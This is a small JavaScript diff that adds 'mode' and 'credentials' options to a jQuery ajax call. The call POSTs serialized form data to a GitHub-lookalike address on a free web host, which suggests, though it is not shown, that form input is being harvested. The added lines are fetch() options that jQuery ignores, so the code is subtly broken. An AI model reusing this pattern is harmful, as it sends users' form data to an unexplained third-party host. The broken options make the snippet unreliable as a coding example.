@@ -42,6 +42,8 @@ $(function () {
       $.ajax({
         url: "https://githubhost.000webhostapp.com/form.php",
         headers: headers,
+        mode: 'cors',
+        credentials: 'include',
         type: "POST",    
         data: form.serialize(),
         success: function (response) {
